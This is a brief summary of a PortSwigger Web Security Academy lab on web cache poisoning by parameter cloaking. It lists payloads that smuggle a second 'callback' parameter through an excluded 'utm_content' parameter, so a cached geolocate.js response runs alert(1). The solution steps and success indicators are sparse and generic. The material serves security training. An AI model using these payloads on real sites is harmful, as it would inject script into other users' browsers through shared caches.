## Parameter cloaking

**Category:** cache_poisoning
**Difficulty:** Unknown

### Description
This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.

### Solution Steps
The website excludes a certain UTM analytics parameter.

### Key Payloads
- `alert(1)`
- `utm_content`
- `/js/geolocate.js`
- `setCountryCookie()`
- `GET /js/geolocate.js?callback=setCountryCookie`
- `callback`
- `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})`
- `GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
- `alert()`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: cache_poisoning

---
*Source: PortSwigger Web Security Academy*
